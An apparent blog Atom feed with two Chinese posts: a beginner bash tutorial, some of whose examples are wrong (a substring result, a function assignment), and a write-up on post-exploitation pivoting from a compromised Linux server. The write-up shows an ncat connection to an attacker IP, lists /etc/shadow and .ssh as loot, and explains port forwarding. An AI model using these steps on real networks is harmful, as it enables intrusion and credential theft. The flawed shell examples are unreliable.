<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>nMask&#39;s Blog</title>
  <subtitle>那一年，风陵渡口.......</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://thief.one/"/>
  <updated>2017-08-11T04:12:16.000Z</updated>
  <id>http://thief.one/</id>
  
  <author>
    <name>nMask</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>【玩转linux系列】shell编程</title>
    <link href="http://thief.one/2017/08/11/1/"/>
    <id>http://thief.one/2017/08/11/1/</id>
    <published>2017-08-11T08:38:23.000Z</published>
    <updated>2017-08-11T04:12:16.000Z</updated>
    
    <content type="html"><![CDATA[<p><blockquote class="blockquote-center">我猜你可能会问我为什么最近更新得这么勤？<br>因为我在充电！<br></blockquote><br>　　如果你去问程序员哪种编程语言最好用，可能会得到很多种答案。但如果问linux下哪种语言使用最方便，shell当之无愧，因为其相当于windows下的bat，可以自动化一些命令操作。当然linux内置安装了很多脚本语言，比如ruby、python等，使用也很方便。作为一名python爱好者，我一般习惯用python去解决问题，但为了能够看懂别人的shell代码，为此也需要学习一些基础的shell语法。<br><a id="more"></a></p>
<h3 id="shell变量"><a href="#shell变量" class="headerlink" title="shell变量"></a>shell变量</h3><h4 id="定义变量"><a href="#定义变量" class="headerlink" title="定义变量"></a>定义变量</h4><p>普通变量：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">a=<span class="string">"123"</span></div><div class="line">b=<span class="string">"test"</span></div></pre></td></tr></table></figure></p>
<p>只读变量：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">a=<span class="string">"123"</span></div><div class="line"><span class="built_in">readonly</span> a</div></pre></td></tr></table></figure></p>
<p>顾名思义，只读变量不能改变内容，否则会报如下错误<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">/bin/sh: NAME: This variable is <span class="built_in">read</span> only.</div></pre></td></tr></table></figure></p>
<h4 id="使用变量"><a href="#使用变量" class="headerlink" title="使用变量"></a>使用变量</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">echo</span> &#123;<span class="variable">$a</span>&#125; 或者 <span class="built_in">echo</span> <span class="variable">$a</span></div><div class="line">c=<span class="variable">$a</span></div></pre></td></tr></table></figure>
<p>只有在使用变量时，变量名前需要加$符号,{}可选当然最好使用。</p>
<h4 id="删除变量"><a href="#删除变量" class="headerlink" title="删除变量"></a>删除变量</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">unset</span> a   <span class="comment"># 不能删除只读变量</span></div></pre></td></tr></table></figure>
<h3 id="shell数据结构"><a href="#shell数据结构" class="headerlink" title="shell数据结构"></a>shell数据结构</h3><h4 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">str=<span class="string">"123"</span></div><div class="line">str=<span class="string">'123'</span></div></pre></td></tr></table></figure>
<ul>
<li>单引号里的任何字符都会原样输出，单引号字符串中的变量是无效的</li>
<li>单引号字串中不能出现单引号（对单引号使用转义符后也不行）</li>
<li>双引号里可以有变量</li>
<li>双引号里可以出现转义字符</li>
</ul>
<h5 id="字符串与字符串变量的拼接"><a href="#字符串与字符串变量的拼接" class="headerlink" title="字符串与字符串变量的拼接"></a>字符串与字符串变量的拼接</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Str_new=<span class="string">"this is "</span><span class="variable">$str</span><span class="string">""</span></div></pre></td></tr></table></figure>
<p>或者<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Str _new=<span class="string">"this is &#123;<span class="variable">$str</span>&#125;"</span></div></pre></td></tr></table></figure></p>
<h5 id="获取字符串长度"><a href="#获取字符串长度" class="headerlink" title="获取字符串长度"></a>获取字符串长度</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">string=<span class="string">"abcd"</span></div><div class="line"><span class="built_in">echo</span> <span class="variable">$&#123;#string&#125;</span> <span class="comment">#输出4</span></div></pre></td></tr></table></figure>
<h5 id="字符串切片"><a href="#字符串切片" class="headerlink" title="字符串切片"></a>字符串切片</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">string=<span class="string">"this is a test"</span></div><div class="line"><span class="built_in">echo</span> <span class="variable">$&#123;string:1:4&#125;</span> <span class="comment"># 输出test</span></div></pre></td></tr></table></figure>
<h4 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h4><p>bash支持一维数组（不支持多维数组），并且没有限定数组的大小。</p>
<h5 id="定义数组"><a href="#定义数组" class="headerlink" title="定义数组"></a>定义数组</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">a=(1 2 3 4)   <span class="comment"># 注意是空格隔开而不是逗号</span></div></pre></td></tr></table></figure>
<p>或者<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">a[0]=1</div><div class="line">a[1]=2</div><div class="line">a[2]=3</div><div class="line">a[3]=4</div></pre></td></tr></table></figure></p>
<h5 id="读取数组"><a href="#读取数组" class="headerlink" title="读取数组"></a>读取数组</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">valuen=<span class="variable">$&#123;array_name[n]&#125;</span> <span class="comment"># 读取指定下标的元素</span></div><div class="line"><span class="built_in">echo</span> <span class="variable">$&#123;array_name[@]&#125;</span>  <span class="comment"># 读取所有元素</span></div></pre></td></tr></table></figure>
<h5 id="数组的长度"><a href="#数组的长度" class="headerlink" title="数组的长度"></a>数组的长度</h5><p>取得数组元素的个数<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">length=<span class="variable">$&#123;#array_name[@]&#125;</span></div></pre></td></tr></table></figure></p>
<p>或者<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">length=<span class="variable">$&#123;#array_name[*]&#125;</span></div></pre></td></tr></table></figure></p>
<p>取得数组单个元素的长度<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">lengthn=<span class="variable">$&#123;#array_name[n]&#125;</span></div></pre></td></tr></table></figure></p>
<h3 id="shell输入输出重定向"><a href="#shell输入输出重定向" class="headerlink" title="shell输入输出重定向"></a>shell输入输出重定向</h3><h4 id="echo"><a href="#echo" class="headerlink" title="echo"></a>echo</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">换行：<span class="built_in">echo</span> -e <span class="string">"OK! \n"</span>    <span class="comment">#-e 开启转义</span></div><div class="line">不换行：<span class="built_in">echo</span> -e <span class="string">"OK! \c"</span>   <span class="comment">#-e 开启转义 \c 不换行</span></div><div class="line">输出变量名：<span class="built_in">echo</span> <span class="string">'$a'</span> 输出<span class="variable">$a</span>    使用单引号即可</div><div class="line">输出命令执行结果：<span class="built_in">echo</span> `date`   使用反引号</div></pre></td></tr></table></figure>
<h4 id="printf"><a href="#printf" class="headerlink" title="printf"></a>printf</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">printf</span> <span class="string">"%-10s %-8s %-4s\n"</span></div><div class="line"><span class="built_in">printf</span> <span class="string">"%-10s %-8s %-4.2f\n"</span></div><div class="line"><span class="built_in">printf</span> <span class="string">"%-10s %-8s %-4.2f\n"</span></div><div class="line"><span class="built_in">printf</span> <span class="string">"%-10s %-8s %-4.2f\n"</span></div></pre></td></tr></table></figure>
<p>%s %c %d %f都是格式替代符%-10s指一个宽度为10个字符（-表示左对齐，没有则表示右对齐），任何字符都会被显示在10个字符宽的字符内，如果不足则自动以空格填充，超过也会将内容全部显示出来。%-4.2f指格式化为小数，其中.2指保留2位小数。</p>
<h3 id="shell传参"><a href="#shell传参" class="headerlink" title="shell传参"></a>shell传参</h3><p>shell代码内容<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#!/bin/bash</span></div><div class="line"><span class="built_in">echo</span> <span class="variable">$0</span></div><div class="line"><span class="built_in">echo</span> <span class="variable">$1</span></div><div class="line"><span class="built_in">echo</span> <span class="variable">$2</span></div></pre></td></tr></table></figure></p>
<p>运行脚本并传参<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">./shell.sh a b</div></pre></td></tr></table></figure></p>
<p>输出结果<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">./shell.sh</div><div class="line">a</div><div class="line">b</div></pre></td></tr></table></figure></p>
<h4 id="特殊参数"><a href="#特殊参数" class="headerlink" title="特殊参数"></a>特殊参数</h4><ul>
<li>$#    传递到脚本的参数个数</li>
<li>$<em>    以一个单字符串显示所有向脚本传递的参数。<br>如”$</em>“用「”」括起来的情况、以”$1 $2 … $n”的形式输出所有参数。</li>
<li>$$    脚本运行的当前进程ID号</li>
<li>$!    后台运行的最后一个进程的ID号</li>
<li>$@    与$*相同，但是使用时加引号，并在引号中返回每个参数。<br>如”$@”用「”」括起来的情况、以”$1” “$2” … “$n” 的形式输出所有参数。</li>
<li>$-    显示Shell使用的当前选项，与set命令功能相同。</li>
<li>$?    显示最后命令的退出状态。0表示没有错误，其他任何值表明有错误。</li>
</ul>
<h3 id="shell函数"><a href="#shell函数" class="headerlink" title="shell函数"></a>shell函数</h3><h4 id="基本格式"><a href="#基本格式" class="headerlink" title="基本格式"></a>基本格式</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">[ <span class="keyword">function</span> ] funname [()]</div><div class="line"></div><div class="line">&#123;</div><div class="line"></div><div class="line">    action;</div><div class="line"></div><div class="line">    [<span class="built_in">return</span> int;]</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h4 id="函数定义"><a href="#函数定义" class="headerlink" title="函数定义"></a>函数定义</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="title">Test</span></span>()</div><div class="line">&#123;</div><div class="line"></div><div class="line"><span class="variable">$a</span>=“123”</div><div class="line"><span class="built_in">return</span> <span class="variable">$a</span></div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h4 id="函数使用并获取返回值"><a href="#函数使用并获取返回值" class="headerlink" title="函数使用并获取返回值"></a>函数使用并获取返回值</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">Test</div><div class="line"><span class="built_in">echo</span> $?    <span class="comment"># $?为函数返回值</span></div></pre></td></tr></table></figure>
<h4 id="函数传参"><a href="#函数传参" class="headerlink" title="函数传参"></a>函数传参</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#函数定义</span></div><div class="line"><span class="function"><span class="title">Test</span></span>()</div><div class="line">&#123;</div><div class="line"><span class="built_in">echo</span> <span class="variable">$1</span></div><div class="line"><span class="built_in">echo</span> <span class="variable">$2</span></div><div class="line"><span class="built_in">echo</span> <span class="variable">$3</span></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">#函数使用</span></div><div class="line">Test a b c</div></pre></td></tr></table></figure>
<h3 id="shell流程控制"><a href="#shell流程控制" class="headerlink" title="shell流程控制"></a>shell流程控制</h3><h4 id="if条件语句"><a href="#if条件语句" class="headerlink" title="if条件语句"></a>if条件语句</h4><h5 id="if-then-else-fi"><a href="#if-then-else-fi" class="headerlink" title="if-then-else-fi"></a>if-then-else-fi</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> condition</div><div class="line"><span class="keyword">then</span></div><div class="line">    command1 </div><div class="line">    command2</div><div class="line">    ...</div><div class="line">    commandN</div><div class="line"><span class="keyword">else</span></div><div class="line">    <span class="built_in">command</span></div><div class="line"><span class="keyword">fi</span></div></pre></td></tr></table></figure>
<h5 id="if-then-elif-then-else-fi"><a href="#if-then-elif-then-else-fi" class="headerlink" title="if-then-elif-then-else-fi"></a>if-then-elif-then-else-fi</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> condition1</div><div class="line"><span class="keyword">then</span></div><div class="line">    command1</div><div class="line"><span class="keyword">elif</span> condition2 </div><div class="line"><span class="keyword">then</span> </div><div class="line">    command2</div><div class="line"><span class="keyword">else</span></div><div class="line">    commandN</div><div class="line"><span class="keyword">fi</span></div></pre></td></tr></table></figure>
<h4 id="for循环语句"><a href="#for循环语句" class="headerlink" title="for循环语句"></a>for循环语句</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">for</span> var <span class="keyword">in</span> item1 item2 ... itemN</div><div class="line"><span class="keyword">do</span></div><div class="line">    command1</div><div class="line">    command2</div><div class="line">    ...</div><div class="line">    commandN</div><div class="line"><span class="keyword">done</span></div></pre></td></tr></table></figure>
<h4 id="while循环语句"><a href="#while循环语句" class="headerlink" title="while循环语句"></a>while循环语句</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">int=1</div><div class="line"><span class="keyword">while</span>(( <span class="variable">$int</span>&lt;=5 ))</div><div class="line"><span class="keyword">do</span></div><div class="line">        <span class="built_in">echo</span> <span class="variable">$int</span></div><div class="line">        <span class="built_in">let</span> <span class="string">"int++"</span></div><div class="line"><span class="keyword">done</span></div></pre></td></tr></table></figure>
<h3 id="shell实战"><a href="#shell实战" class="headerlink" title="shell实战"></a>shell实战</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#! /bin/bash</span></div><div class="line"></div><div class="line"><span class="comment">#shell综合运用</span></div><div class="line"></div><div class="line">a=`whoami` <span class="comment">#执行命令</span></div><div class="line">b=`date`</div><div class="line">c=<span class="string">"open"</span></div><div class="line">d=`cat test.log | grep <span class="variable">$c</span>`</div><div class="line"></div><div class="line"><span class="built_in">echo</span> <span class="variable">$d</span></div><div class="line"><span class="built_in">echo</span> <span class="string">"user is <span class="variable">$a</span> time is <span class="variable">$b</span>"</span></div></pre></td></tr></table></figure>
<h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="http://www.runoob.com/linux/linux-shell.html" target="_blank" rel="external">http://www.runoob.com/linux/linux-shell.html</a></p>
<h3 id="传送门"><a href="#传送门" class="headerlink" title="传送门"></a>传送门</h3><p><a href="https://thief.one/2017/08/09/2/">【玩转linux系统】Linux内网渗透</a><br><a href="https://thief.one/2017/08/09/1/">【玩转linux系列】Vim使用</a><br><a href="https://thief.one/2017/08/08/1/">【玩转linux系列】Linux基础命令</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;blockquote class=&quot;blockquote-center&quot;&gt;我猜你可能会问我为什么最近更新得这么勤？&lt;br&gt;因为我在充电！&lt;br&gt;&lt;/blockquote&gt;&lt;br&gt;　　如果你去问程序员哪种编程语言最好用，可能会得到很多种答案。但如果问linux下哪种语言使用最方便，shell当之无愧，因为其相当于windows下的bat，可以自动化一些命令操作。当然linux内置安装了很多脚本语言，比如ruby、python等，使用也很方便。作为一名python爱好者，我一般习惯用python去解决问题，但为了能够看懂别人的shell代码，为此也需要学习一些基础的shell语法。&lt;br&gt;
    
    </summary>
    
      <category term="编程之道" scheme="http://thief.one/categories/%E7%BC%96%E7%A8%8B%E4%B9%8B%E9%81%93/"/>
    
    
      <category term="linux" scheme="http://thief.one/tags/linux/"/>
    
      <category term="shell" scheme="http://thief.one/tags/shell/"/>
    
  </entry>
  
  <entry>
    <title>【玩转linux系统】Linux内网渗透</title>
    <link href="http://thief.one/2017/08/09/2/"/>
    <id>http://thief.one/2017/08/09/2/</id>
    <published>2017-08-09T08:24:01.000Z</published>
    <updated>2017-08-11T04:04:49.000Z</updated>
    
    <content type="html"><![CDATA[<p><blockquote class="blockquote-center">Nothing great was ever achieved without enthusiasm<br>无热情成就不了伟业<br></blockquote><br>　　前段时间做了一次不算成功也不算完整的linux内网渗透，不算成功是因为并没有拿下内网中其他服务器的权限，不算完整是因为由于某些原因测试被迫暂时中止。虽然这次linux内网渗透不算是一个很好的教学案例，但我还是决定把过程记录一下，尤其重点记录linux内网渗透的思路，以防遗忘。<br><a id="more"></a><br>　　网上关于内网渗透的资料很多，我在做测试之前也是翻阅了很多资料。本篇标题突出linux，是因为本次测试不涉及windows系统，当然linux与windows内网渗透的原理差不多，只不过使用的工具有所区别。</p>
<h3 id="收集测试网络环境"><a href="#收集测试网络环境" class="headerlink" title="收集测试网络环境"></a>收集测试网络环境</h3><p>　　当我们拿到一台目标内网服务器，或者说肉鸡服务器，首先要做的就是收集信息。而在我看来需要收集的信息中，最重要的之一便是肉鸡的网络环境。</p>
<h4 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h4><p>首先介绍下本次测试的服务器环境：</p>
<ul>
<li>攻击机Mac：110.xx.xx.xx   外网 </li>
<li>肉鸡centos：192.168.16.x  目标内网16网段系统</li>
<li>内网渗透范围：192.168.17.0/24  目标内网17网段系统</li>
</ul>
<p>本次测试模拟假设：由于肉鸡服务器上对外开放了存在漏洞的web应用，被入侵植入webshell。<br>本次测试目的：通过肉鸡服务器上的shell，深入渗透内网17网段的服务器。</p>
<h4 id="收集测试哪些网络数据？"><a href="#收集测试哪些网络数据？" class="headerlink" title="收集测试哪些网络数据？"></a>收集测试哪些网络数据？</h4><p>　　ok，目前我已经拥有了肉鸡的shell，那么该收集肉鸡服务器的哪些网络环境呢？又该如何去测试？我认为至少要收集以下几点网络环境信息：</p>
<ul>
<li>肉鸡服务器与外网的连通性</li>
<li>肉鸡服务器与内网其他网段的连通性</li>
<li>肉鸡服务器与外网之间是否有端口访问限制</li>
<li>肉鸡服务器与内网其他网段之间是否有端口访问限制</li>
</ul>
<p>注：连通性主要是指能否ping通，需要双方互相ping测试；端口访问限制，指的是目标网络边界是否有堡垒机或者防火墙，对进出的端口是否有做限制。</p>
<h4 id="端口访问限制测试"><a href="#端口访问限制测试" class="headerlink" title="端口访问限制测试"></a>端口访问限制测试</h4><p>ping测试这里不介绍了，主要说下如何测试端口访问限制，可以使用的工具如下：</p>
<ul>
<li>curl、wget（可连接web服务，主要为80、443、8000+端口）</li>
<li>telnet（可主动连接指定ip的指定port）</li>
<li>nmap（可扫描端口，open或者filter）</li>
<li>ncat（可以创建端口监听，也可以主动连接）</li>
<li>python（可主动创建端口监听）<br>……</li>
</ul>
<p>在测试端口访问限制前，我们先要搞清楚当前的网络环境。本次测试中，攻击机在外网而肉鸡在内网，因此正常情况下攻击机是无法直接访问到肉鸡上某个端口的（需要网络边界路由器做端口映射）。</p>
<h5 id="反向连接测试"><a href="#反向连接测试" class="headerlink" title="反向连接测试"></a>反向连接测试</h5><p>我们在测试端口访问限制时，首先可以利用ncat在攻击机上监听一个端口。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ncat -l -p 9999</div></pre></td></tr></table></figure></p>
<p>然后利用ncat或者telnet等工具在肉鸡上尝试连接，我称之为反向连接测试。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ncat 110.xx.xx.xx 9999</div></pre></td></tr></table></figure></p>
<p>注：监听的端口可以随机选取，尽量选取多个端口尝试多次；如果肉鸡能够访问攻击机的任何端口，说明目标网络边界没有对出方向的连接做限制，了解这方面的信息对后面的端口转发有很大好处。</p>
<h5 id="正向连接测试"><a href="#正向连接测试" class="headerlink" title="正向连接测试"></a>正向连接测试</h5><p>　　我们也可以在肉鸡上监听一个端口，攻击机上尝试连接（这里连接的是肉鸡的外网ip地址，肉鸡对外开放的web应用肯定是以一个外网ip或者域名的形式存在，而该ip在本次测试中并不是肉鸡真正的ip地址，是目标边界网络设备的ip，原理是通过端口映射将网络设备（外网ip）上的web端口映射到了肉鸡（内网ip）的web端口上），我称之为正向连接测试。<br>　　尝试连接肉鸡外网地址的端口，意义在于有些粗心的管理员会在网络设备上设置全端口映射，也就是说肉鸡上监听任何端口都能映射到网络边界设备的相同端口上，那么这跟肉鸡服务器直接处在外网就没差了。</p>
<h3 id="收集服务器信息"><a href="#收集服务器信息" class="headerlink" title="收集服务器信息"></a>收集服务器信息</h3><p>收集信息可以说是渗透测试的第一步，内网渗透也一样，收集的服务器信息越多，渗透的成功率就越大。</p>
<h4 id="查看系统内核"><a href="#查看系统内核" class="headerlink" title="查看系统内核"></a>查看系统内核</h4><p>linux系统上查看内核版本如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">lsb_release –a</div></pre></td></tr></table></figure></p>
<p>　　一般系统的入侵途径是先提权，而提权可以通过linux内核漏洞进行，因此可以先查看linux内核版本，然后根据内核<a href="https://www.kernel-exploits.com/" target="_blank" rel="external">寻找exp的网站</a>，上传exp进行提权。由于本次测试不涉及提权部分，因此不做测试，另外补充一句：内核提权有宕机风险，请谨慎操作。</p>
<h4 id="查看操作系统位数"><a href="#查看操作系统位数" class="headerlink" title="查看操作系统位数"></a>查看操作系统位数</h4><p>linux系统上查看位数如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">getconf LONG_BIT</div></pre></td></tr></table></figure></p>
<p>说明：知道系统是32位还是64位对后期生成msf木马有帮助。</p>
<h4 id="系统敏感信息"><a href="#系统敏感信息" class="headerlink" title="系统敏感信息"></a>系统敏感信息</h4><p>收集一些系统相关的敏感信息，比如账号密码、日志、历史命令、ssh文件等。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">/etc/shadow</div><div class="line">/etc/passwd</div><div class="line">/var/<span class="built_in">log</span></div><div class="line"><span class="built_in">history</span></div><div class="line">.ssh</div><div class="line">......</div></pre></td></tr></table></figure></p>
<h4 id="web敏感信息"><a href="#web敏感信息" class="headerlink" title="web敏感信息"></a>web敏感信息</h4><p>如果服务器存在web应用，可以查看web目录下是否存在敏感信息，比如连接数据库的配置文件等等。</p>
<h3 id="内网扫描"><a href="#内网扫描" class="headerlink" title="内网扫描"></a>内网扫描</h3><p>　　当信息收集完成后，可以尝试扫描一下内网的机器，比如主机存活扫描、端口扫描、arp扫描等。端口扫描可以使用nmap、msf等工具，但如果服务器上没有安装这些工具时，通常有3种手段可以达到内网端口扫描的效果。第一种就是服务器上安装扫描工具，这里不多说也不推荐，因为动静大且麻烦(当然可以上传python扫描端口的脚本，不需要编译安装，比较方便。)；第二种就是端口转发，将服务器内网端口转发到外网进行扫描；第三种就是代理扫描，也就是把装有扫描工具的攻击机代理到目标内网环境。<br>　　无论是端口转发扫描还是代理扫描，原理都是打通攻击机（外网）与肉鸡（内网）的连通性，即让攻击机可以直接访问到肉鸡所在的内网资源。这里的连接不借助于目标网络边界设备的端口映射功能，因此与攻击机访问肉鸡web服务所产生的连接有所区别。</p>
<h4 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h4><p>　　想要达到以上所介绍的彼此”直接”的连接，我们需要一个中间的桥梁，来传递内外网（攻击机与肉鸡）之间的数据。搭建这种桥梁的方式有很多，我们首先可以想到端口转发，即把肉鸡服务器上的某个端口转发到攻击机的某个端口上，这样攻击机上访问本机某个端口，就相当于访问了肉鸡服务器上的某个端口。</p>
<p>端口转发的工具：lcx、meterpreter等，具体用法后面会介绍<br>端口转发类型：tcp端口转发、http转发、ssh转发等</p>
<h5 id="tcp端口转发"><a href="#tcp端口转发" class="headerlink" title="tcp端口转发"></a>tcp端口转发</h5><p>本机转发：攻击机上监听2222、3333端口，肉鸡上连接攻击机的2222端口，并转发肉鸡22端口。<br>转发连接原理：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">肉鸡22端口&lt;--&gt;肉鸡随机高端口&lt;--&gt;肉鸡随机高端口&lt;--&gt;攻击机上2222高端口&lt;--&gt;攻击机随机高端口&lt;--&gt;攻击机3333端口</div></pre></td></tr></table></figure></p>
<p>注：此时我们去连接攻击机的3333端口，就相当于连接了肉鸡的22端口。</p>
<p>远程转发：攻击机上监听2222、3333端口，肉鸡上连接攻击机的2222端口，并转发内网目标服务器的22端口。（前提是肉鸡能够连接目标服务器的22端口）<br>转发连接原理：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">内网目标服务器22端口&lt;--&gt;肉鸡随机高端口&lt;--&gt;肉鸡随机高端口&lt;--&gt;攻击机上2222高端口&lt;--&gt;攻击机随机高端口&lt;--&gt;攻击机3333端口</div></pre></td></tr></table></figure></p>
<p>注：此时我们去连接攻击机的3333端口，就相当于连接了目标服务器的22端口。<br>　　<br>说明：从上面的连接过程不难看出，端口转发比较难以防范的原因就在于，攻击机上监听的端口是随机的，不可预知的，因此不可能事先在堡垒机或者防火墙上做出方向的端口策略，除非禁止服务器访问外部所有端口（现实情况大多只对进方向的端口连接做限制）。</p>
<h5 id="http转发"><a href="#http转发" class="headerlink" title="http转发"></a>http转发</h5><p>　　有些安全意思强的管理员，会对一些服务器做禁止访问外网的策略，即服务器禁止连接任何外网的端口。此时普通的tcp端口转发就没有效果了，因为转发的前提是要能互相连接上。此种情况，可以使用http转发。<br>转发连接原理：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">肉鸡web端口(80)&lt;--&gt;网络边界设备端口(80)&lt;--&gt;攻击机随机端口</div></pre></td></tr></table></figure></p>
<p>注：这里之所以能够连通，是借助了服务器上的web服务，以及网络边界设备的映射功能。</p>
<p>说明：虽然肉鸡不能访问外网任何端口，但只要它对外提供web服务，就说明它还能跟外界通信，只不过这种通信局限于web服务端口中，并且肉鸡不是直接跟攻击机通信，而是借助了边界设备。</p>
<h4 id="代理扫描内网"><a href="#代理扫描内网" class="headerlink" title="代理扫描内网"></a>代理扫描内网</h4><p>　　以上介绍了几种端口转发的使用以及原理，从中我们不难看出端口转发固然厉害，但也很局限，因为每次都只能转发一个ip的一个端口，对于扫描来说，并不是最好的选择方案。因此出现了一种更好的技术方案–代理扫描，其原理与端口转发差不多，都是需要搭建一个桥梁，而这个桥梁往往不是某个端口，而是shell或者说session。</p>
<p>代理扫描同样可以分为tcp代理扫描、http代理扫描。</p>
